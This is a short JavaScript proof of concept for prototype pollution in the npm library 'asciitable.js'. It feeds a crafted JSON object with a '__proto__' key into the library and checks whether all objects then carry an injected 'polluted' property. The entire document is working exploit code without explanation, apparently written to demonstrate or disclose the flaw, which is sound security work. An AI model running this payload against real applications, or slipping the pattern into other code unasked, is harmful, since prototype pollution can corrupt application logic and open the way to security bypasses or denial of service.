var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const req = require('asciitable.js');
const b = JSON.parse('{"__proto__":{"polluted":"yes"}}');
req(obj, b);
console.log({}.polluted);